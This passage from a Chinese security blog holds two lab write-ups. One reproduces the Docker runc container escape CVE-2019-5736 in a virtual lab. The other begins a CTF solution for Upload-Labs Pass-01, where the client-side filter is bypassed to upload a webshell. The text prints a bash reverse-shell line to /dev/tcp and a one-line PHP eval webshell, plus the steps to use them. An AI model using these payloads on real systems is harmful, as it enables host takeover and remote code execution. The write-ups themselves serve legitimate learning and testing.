src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.37.53.png" style="zoom:50%;"><p>重新执行一次启动命令，还是失败。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.39.10.png" style="zoom:50%;"><p>查看容器启动的日志：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> logs 8e17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.46.05.png" style="zoom:50%;"><p>从日志可以看出，确实是执行docker容器逃逸攻击导致的问题。因为本地的<code>/bin/sh</code>文件被恶意替换了。docker启动容器是调用runc运行时环境失败，所以容器也就无法启动了。所以，要意识到做虚拟机快照的重要性，可以省去很多麻烦。</p></blockquote><p>重新恢复虚拟机环境。</p><p>重新编译一下POC，重点注意ip端口和执行的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传至/tmp目录。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.47.38.png" style="zoom:50%;"><p>修改权限。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.49.00.png" style="zoom:50%;"><p>右侧是容器提权后的root权限的shell。</p><p>左侧监听连接，如果能够监听到连接则表明成功实现了逃逸，获得了宿主机的shell。</p><p>在容器的shell中执行./main，覆盖宿主机的/bin/sh文件。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.50.38.png" style="zoom:50%;"><p>然后登录web2，模拟管理员用docker exec进入容器。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.52.57.png" alt="截屏2025-01-06 10.52.57" style="zoom:50%;"><p>容器root shell提示获取到文件句柄。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.53.09.png" style="zoom:50%;"><p>但是没有获取到shell。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2010.53.54.png" style="zoom:40%;"><h2 id="2-5-复现失败"><a href="#2-5-复现失败" class="headerlink" title="2.5 复现失败"></a>2.5 复现失败</h2><p>目前的环境时Ubuntu 14.04，可能目前的POC无法起作用。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.02.23.png" style="zoom:50%;"><p><code>Tested on Ubuntu 18.04, Debian 9, and Arch Linux. </code>作者这里测试环境不包含14.04，可能还是需要搭建符合要求的环境才能实现。</p><h1 id="三、漏洞复现（centos7复现成功）"><a href="#三、漏洞复现（centos7复现成功）" class="headerlink" title="三、漏洞复现（centos7复现成功）"></a>三、漏洞复现（centos7复现成功）</h1><h2 id="3-1-实验环境"><a href="#3-1-实验环境" class="headerlink" title="3.1 实验环境"></a>3.1 实验环境</h2><h3 id="3-1-1-centos-7"><a href="#3-1-1-centos-7" class="headerlink" title="3.1.1 centos 7"></a>3.1.1 centos 7</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.28.52.png" style="zoom:50%;"><h4 id="1）卸载已经安装的Docker"><a href="#1）卸载已经安装的Docker" class="headerlink" title="1）卸载已经安装的Docker"></a>1）卸载已经安装的Docker</h4><blockquote><p>1）步骤一：杀死所有运行中的容器。</p><p>首先，确保没有任何容器在运行。使用以下命令杀死所有运行中的容器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">kill</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）步骤二：删除所有 Docker 容器</p><p>接下来，删除系统中所有存在的 Docker 容器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）步骤三：删除所有 Docker 镜像</p><p>为了确保系统清洁，删除所有 Docker 镜像：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> rmi <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> images <span class="token parameter variable">-q</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删不掉的加-f参数</p><p>4）步骤四：停止 Docker 服务</p><p>在进行下一步之前，确保停止 Docker 服务及其相关的套接字：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop docker.socket<span class="token function">sudo</span> systemctl stop docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5）步骤五：删除存储目录</p><p>Docker 会在系统中创建多个存储目录。删除这些目录以彻底清除 Docker 数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/docker<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /run/docker<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/dockershim<span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /var/lib/docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6）步骤六：卸载 Docker</p><p>查看已安装的 Docker 包</p><p>首先，检查系统上已安装的 Docker 包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum list installed <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.41.54.png" style="zoom:50%;"><p>7）卸载相关包</p><p>然后，使用以下命令卸载所有与 Docker 相关的包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum remove <span class="token parameter variable">-y</span> <span class="token string">'docker*'</span><span class="token function">sudo</span> yum remove <span class="token parameter variable">-y</span> containerd.io.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过以上步骤，你可以在 CentOS 7 系统上彻底卸载 Docker 和清理所有相关数据。确保每个步骤都正确执行，以避免残留数据影响后续操作。</p></blockquote><h4 id="2）安装低版本的docker"><a href="#2）安装低版本的docker" class="headerlink" title="2）安装低版本的docker"></a>2）安装低版本的docker</h4><ul><li>列出可用版本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum list docker-ce <span class="token parameter variable">--showduplicates</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2011.44.44.png" style="zoom:50%;"><ul><li>安装有漏洞版本&lt;=18.09.2，这里选择18.06.0.ce-3.el7版本</li></ul><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.14.57.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce-18.06.0.ce-3.el7 <span class="token parameter variable">-y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.15.39.png" style="zoom:40%;"><ul><li>查看版本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token parameter variable">-v</span>docker-runc <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看到docker版本为18.06.0.ce&lt;18.09.2，runc版本为1.0.0 rc5&lt;1.0-rc6。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.17.47.png" style="zoom:50%;"><p>注：高版本docker中使用runc -v来runc查版本。</p><ul><li>启动docker</li></ul><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.20.10.png" style="zoom:40%;"><h3 id="3-1-2-模拟失陷容器"><a href="#3-1-2-模拟失陷容器" class="headerlink" title="3.1.2 模拟失陷容器"></a>3.1.2 模拟失陷容器</h3><p>模拟启动一个被攻击失陷的容器。</p><p>在受害者机器（即这里的centos7 ）上启动一个容器 ，搭建攻击环境。</p><h4 id="1）拉取镜像"><a href="#1）拉取镜像" class="headerlink" title="1）拉取镜像"></a>1）拉取镜像</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="大战bug-「拉取镜像失败」："><a href="#大战bug-「拉取镜像失败」：" class="headerlink" title="大战bug-「拉取镜像失败」："></a>大战bug-「拉取镜像失败」：</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.21.01.png" style="zoom:50%;"><p>之前就碰到过类似的问题，原因就是docker官方仓库被墙了。</p><p>解决：</p><p>核心就是找到能用的镜像仓库，目前可用的配置如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.zhai.cm"]}EOF</span>systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再尝试拉取一下nginx镜像。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.26.33.png" style="zoom:30%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.27.36.png" style="zoom:40%;"><p>还是拉取不下来。可以等等看，如果站点不通过科学上网还能访问的话应该问题不大，拉取的时候比较随缘，可能需要多次尝试。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2013.53.59.png" style="zoom:40%;"><p>等了半天还是拉取不下来，还是说不准哪里就会出现问题。需要不断寻找能用的仓库。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.hpcloud.cloud"</span>, <span class="token string">"https://docker.m.daocloud.io"</span>, <span class="token string">"https://docker.unsee.tech"</span>, <span class="token string">"https://docker.1panel.live"</span>, <span class="token string">"http://mirrors.ustc.edu.cn"</span>, <span class="token string">"https://docker.chenby.cn"</span>, <span class="token string">"http://mirror.azure.cn"</span>, <span class="token string">"https://dockerpull.org"</span>, <span class="token string">"https://dockerhub.icu"</span>, <span class="token string">"https://hub.rat.dev"</span>, <span class="token string">"https://proxy.1panel.live"</span>, <span class="token string">"https://docker.1panel.top"</span>, <span class="token string">"https://docker.m.daocloud.io"</span>, <span class="token string">"https://docker.1ms.run"</span>, <span class="token string">"https://docker.ketches.cn"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置上面的仓库地址还是无法拉取，折磨。。。。。。</p><p>后面耐心多尝试了几次又可以了，麻！</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.28.32.png" style="zoom:40%;"></blockquote><h4 id="2）运行容器"><a href="#2）运行容器" class="headerlink" title="2）运行容器"></a>2）运行容器</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">--name</span> nginx-test <span class="token parameter variable">-p</span> <span class="token number">8080</span>:80 <span class="token parameter variable">-d</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.30.29.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.31.14.png" style="zoom:40%;"><h3 id="3-1-3-攻击机"><a href="#3-1-3-攻击机" class="headerlink" title="3.1.3 攻击机"></a>3.1.3 攻击机</h3><p>kali linux：ip 192.168.52.5</p><h2 id="3-2-漏洞复现"><a href="#3-2-漏洞复现" class="headerlink" title="3.2 漏洞复现"></a>3.2 漏洞复现</h2><p>前提：假定攻击者已经拿下容器的root权限（一般攻击者会通过webshell+提权的方式实现这一目标，参考本站《 三层网络靶场(WHOAMI)从打点到拿下域控》一文）。</p><p>目标：通过Runc逃逸漏洞拿下宿主机的root权限。</p><h3 id="3-2-1-恶意脚本编译"><a href="#3-2-1-恶意脚本编译" class="headerlink" title="3.2.1 恶意脚本编译"></a>3.2.1 恶意脚本编译</h3><p>这个过程跟2.2 节一样，不赘述。</p><p>payload执行后反弹的shell连接的目标地址为 <code>192.168.43.27:3333</code>。</p><h3 id="3-2-2-将payload传入失陷的容器中"><a href="#3-2-2-将payload传入失陷的容器中" class="headerlink" title="3.2.2 将payload传入失陷的容器中"></a>3.2.2 将payload传入失陷的容器中</h3><p>将该payload(main文件)拷贝到docker容器中（这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸）并将main文件修改权限可执行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">cp</span> main 59f2:/home<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 59f2 /bin/sh<span class="token builtin class-name">cd</span> home<span class="token function">chmod</span> <span class="token number">777</span> main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.52.53.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.54.04.png" style="zoom:40%;"><h3 id="3-2-3-发起攻击"><a href="#3-2-3-发起攻击" class="headerlink" title="3.2.3 发起攻击"></a>3.2.3 发起攻击</h3><h4 id="1）执行-main"><a href="#1）执行-main" class="headerlink" title="1）执行./main"></a>1）执行./main</h4><p>这一步的目的是执行payload覆盖宿主机的/bin/sh。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.56.27.png" style="zoom:50%;"><h4 id="2）攻击者监听反弹的shell"><a href="#2）攻击者监听反弹的shell" class="headerlink" title="2）攻击者监听反弹的shell"></a>2）攻击者监听反弹的shell</h4><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.57.20.png" style="zoom:40%;"><h4 id="3）模拟受害者进入容器触发payload"><a href="#3）模拟受害者进入容器触发payload" class="headerlink" title="3）模拟受害者进入容器触发payload"></a>3）模拟受害者进入容器触发payload</h4><p>重新打开一个ssh会话，执行进入容器的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 59f2 /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2014.59.31.png" style="zoom:50%;"><p>观察容器shell会话的显示：</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.00.36.png" style="zoom:50%;"><p>攻击成功。</p><h4 id="4）攻击侧弹回的shell"><a href="#4）攻击侧弹回的shell" class="headerlink" title="4）攻击侧弹回的shell"></a>4）攻击侧弹回的shell</h4><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.03.39.png" style="zoom:50%;"><p>发现没有反弹回shell。</p><p>原因分析：kali采用了桥接方式，在192.168.43.27/24网段，centos7受害机在192.168.52.4/24网段。无法连通，如果kali具备公网ip且centos7能够访问互联网，应该会反弹成功。</p><ul><li><p>将centos7改成桥接模式，IP-192.168.43.181/24。kali还是获取不到shell。</p></li><li><p>将centos7改回NAT模式 192.168.52.4 ，kali也改成NAT模式 192.168.52.5。</p></li></ul><p>重新操作一遍。</p><p>修改payload的反弹shell回连地址：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> payload<span class="token operator">=</span><span class="token string">"#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.52.5/4444 0&gt;&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.43.44.png" style="zoom:40%;"><p>搞定：✅</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.48.48.png" style="zoom:50%;"><p>成功获取到宿主机的shell（ip是宿主机的ip192.168.52.4），并且权限是root。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.49.43.png" style="zoom:40%;"><blockquote><p>同样的方法在ubuntu16.04 重新操作一次，还是没有成功：</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.03.03.png" style="zoom:67%;"><p>看来该漏洞的利用比较以来操作系统、docker和runc的具体版本。</p></blockquote><p>至此，docker容器逃逸-CVE-2019-5736成功复现。</p><h1 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h1><ul><li>2024年1月的 Runc容器逃逸漏洞：<a href="https://nitroc.org/posts/cve-2024-21626-illustrated/#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">https://nitroc.org/posts/cve-2024-21626-illustrated/#%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> 容器逃逸 </tag>
            
            <tag> CVE-2019-5736 </tag>
            
            <tag> docker逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(Upload-Labs-Linux)-文件上传</title>
      <link href="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/"/>
      <url>/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><p>题目连接：<a href="https://buuoj.cn/challenges#Upload-Labs-Linux">https://buuoj.cn/challenges#Upload-Labs-Linux</a></p><p>靶场其实是一个部署在Linux环境中的Upload-Labs（玩过文件上传的应该都接触过这个靶场）。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.37.09.png" style="zoom:30%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.36.54.png" style="zoom:30%;"><p><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h1 id="一、Pass-01（前端检测后缀名）"><a href="#一、Pass-01（前端检测后缀名）" class="headerlink" title="一、Pass-01（前端检测后缀名）"></a>一、Pass-01（前端检测后缀名）</h1><h2 id="1-1-题面"><a href="#1-1-题面" class="headerlink" title="1.1 题面"></a>1.1 题面</h2><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.03.png" style="zoom:40%;"><h2 id="1-2-解题"><a href="#1-2-解题" class="headerlink" title="1.2 解题"></a>1.2 解题</h2><p>直接上传yjh.php</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.44.42.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>yakit开启劫持，点击上传，发现有弹窗提示只能上传jpg、png、gif等类型的文件，并且yakit没有抓到包。说明请求在前端就被拦截了，都没到yakit那里，所以推测前端有相关的防护措施，需要先进行绕过。查看前端的源代码，发现有检测文件后缀的逻辑，确实是在前端做了限制：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span>    <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//定义允许上传的文件类型</span>        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>        <span class="token comment">//提取上传文件的类型</span>        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//判断上传文件类型是否允许上传</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.45.49.png" style="zoom:40%;"><p>直接将文件的后缀名.php后缀为.jpg，尝试绕过前端并开启拦截。这次能拦截到请求包了：</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.55.27.png" style="zoom:50%;"><p> 前端限制已被绕过。在这里将.jpg后缀改成.php后缀，因为只有这样我们的webshell才会被服务端解析执行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"yjh.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改之后发送请求，发现上传成功了。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.58.16.png" style="zoom:50%;"><p>说明后端没有做上传文件的安全检测，并且从响应中也能找到上传成功的文件路径<code>../upload/yjh.php</code>，当前路径是<code>/Pass-01/index.php</code>，那么上传的路径应该是<code>/upload/yjh.php</code>。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2017.59.52.png" style="zoom:50%;"><p>那么接下来可以尝试连接一下webshell。</p><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2018.04.03.png" style="zoom:50%;"><img src="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-02%2018.05.12.png" style="zoom:50%;"><p>成功getshell，并在根目录下拿到flag。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>6ee48577-f975-4280-9243-f91c87cadf98<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-3-代码审计"><a href="#1-3-代码审计" class="headerlink" title="1.3 代码审计"></a>1.3 代码审计</h2><p>看一下本关的源代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string 